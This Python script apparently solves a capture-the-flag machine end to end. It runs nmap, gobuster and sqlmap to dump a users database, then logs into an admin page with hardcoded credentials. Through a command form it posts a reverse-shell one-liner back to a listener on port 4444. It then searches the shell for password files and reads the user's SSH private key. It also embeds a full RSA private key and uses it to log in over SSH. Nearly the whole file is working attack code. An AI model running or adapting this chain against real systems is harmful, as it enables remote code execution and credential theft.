import subprocess
from http.server import HTTPServer,BaseHTTPRequestHandler
import urllib3
import requests
import re
from bs4 import BeautifulSoup
from pwn import *
import paramiko
import time
import threading




urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def reverseConnection():
    print("\n\n[*] Starting listener on port 4444...")
    listener = listen(4444)


    secondThread=threading.Thread(target=makeReverseConnection)

    secondThread.daemon=True

    secondThread.start()

    time.sleep(1)

    print("[*] Waiting for connection...")
    target_connection = listener.wait_for_connection()



    print("[+] Connection received!")

    print("[*] Spawning PTY on target...")
    target_connection.sendline(b'''python3 -c "import pty; pty.spawn('/bin/bash')"''')
    sleep(1)
    try:
        output = target_connection.recv(timeout=5)
        print("\n[+] Search Results:")
        print(output.decode('utf-8'))
    except Exception as e:
        print(f"[-] Could not read output: {e}")


    target_connection.sendline(b"export TERM=xterm")
    sleep(1) 


    print("[*] Hunting for flags...")

    target_connection.sendline(b'find /home/pingu | grep id_rsa')

    sleep(3) 

    try:
        output = target_connection.recv(timeout=5)
        print("\n[+] Search Results:")
        print(output.decode('utf-8'))
    except Exception as e:
        print(f"[-] Could not read output: {e}")


    target_connection.sendline(b'find /var | grep pass')

    sleep(3) 

    try:
        output = target_connection.recv(timeout=5)
        print("\n[+] Search Results:")
        print(output.decode('utf-8'))
    except Exception as e:
        print(f"[-] Could not read output: {e}")


    target_connection.sendline(b'cat /var/hidden/pass')

    sleep(3) 

    try:
        output = target_connection.recv(timeout=5)
        print("\n[+] Search Results:")
        print(output.decode('utf-8'))
    except Exception as e:
        print(f"[-] Could not read output: {e}")


    target_connection.sendline(b'cat /home/pingu/.ssh/id_rsa')

    sleep(3) 

    try:
        output = target_connection.recv(timeout=5)
        print("\n[+] Search Results:")
        print(output.decode('utf-8'))
    except Exception as e:
        print(f"[-] Could not read output: {e}")




def makeReverseConnection():
    urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)


    proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

    url="http://10.49.187.31/administrator.php"

    params={'username':'pingudad',
            'password':'secretpass'}

    session=requests.session()


    login=session.post(url,data=params,verify=False,proxies=proxies)

    soup=BeautifulSoup(login.text,'html.parser')

    form=soup.find('form')

    if form :
        formVal=form.get('action')
        url=f"http://10.49.187.31/{formVal}"
        params={'cmd':f"""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.145.104",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""}

        cmdOutput=session.post(url,data=params,verify=False,proxies=proxies)



def nmapScan(ip):
    print(f"\n\nPerforming nmap Scan to the IP : {ip}\n")

    cmd=["sudo","nmap","-sV",f"{ip}"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    nmap_output=result.stdout

    return nmap_output


def goBuster(url):
    print(f"Performing GoBuster in this url :  {url}")

    cmd=["gobuster","dir","-u",f"{url}","-w","/usr/share/wordlists/dirb/common.txt","-x","php,html,txt"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    output=result.stdout

    return output



def sqlMAP(url):
    print(f"Performing sqlMAP in this url :  {url}")

    cmd=["sqlmap","-u",f"{url}","--data=username=&password=","--dbs","--batch"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    output_2=result.stdout

    print(f"\n\nSQLMap DBS Info \n{output_2}\n\n")

    cmd=["sqlmap","-u",f"{url}","--data=username=&password=","-D","users","--tables","--batch"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    output_3=result.stdout

    print(f"\n\nSQLMap Users Info \n{output_3}\n\n")

    cmd=["sqlmap","-u",f"{url}","--data=username=&password=","-D","users","-T","users","--dump","--batch"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    output_4=result.stdout

    print(f"\n\nSQLMap Users Data \n{output_4}\n\n")
    

    return True



def main():

    targetIp=input("What is the Target machine IP : ")
    print("Challenge Started\n\n")
    # print(nmapScan(targetIp))
    # url=f"http://{targetIp}"
    # print(goBuster(url))
    # url=f"http://{targetIp}/administrator.php"
    # print(sqlMAP(url))

    reverseConnection()

    RSA_KEY="""-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----"""
    password=input("Copy the Password you got ")

    with open("id_rsa","w") as f:
        f.write(RSA_KEY)

    os.chmod("id_rsa",0o600)

    print("\n\nConnecting Via SSH......\n\n")

    key=paramiko.RSAKey.from_private_key_file("id_rsa")
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(targetIp,username="pingu",pkey=key,password=password)

    print(f" Now Conencted to the {targetIp} via SSH")

    stdin, stdout,stderr=ssh.exec_command("pwd")

    print(stdout.read().decode())
    



main()